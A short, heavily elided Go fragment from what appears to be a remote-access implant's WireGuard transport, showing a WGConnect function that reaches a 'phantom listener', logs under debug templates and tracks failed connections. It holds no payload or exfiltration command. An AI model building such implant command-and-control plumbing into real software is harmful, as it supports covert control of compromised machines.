...
import (
	...
	"github.com/cryptdefender3232/phantom/implant/phantom/netstack"
...
func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
	...
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect to phantom listener: %v", err)
		// {{end}}
		failedConn++
		return nil, nil, err
	}
	...
	// {{if .Config.Debug}}
	log.Printf("Successfully connected to phantom listener")
	// {{end}}
	failedConn = 0
	tunnelNet = tNet
